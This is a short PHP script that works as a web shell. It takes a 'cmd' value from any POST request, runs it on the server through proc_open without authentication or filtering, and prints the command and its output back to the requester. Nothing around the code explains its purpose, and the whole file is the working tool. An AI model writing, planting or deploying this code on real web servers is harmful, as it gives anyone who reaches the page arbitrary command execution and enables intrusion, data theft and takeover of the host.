<?php
  if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    $descriptorspec = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w")
    );
    $process = proc_open($cmd, $descriptorspec, $pipes);
    echo "Command: $cmd<br>";
    if (is_resource($process)) {
      while ($s = fgets($pipes[1])) {
        print $s;
      }
    }
  }
?>
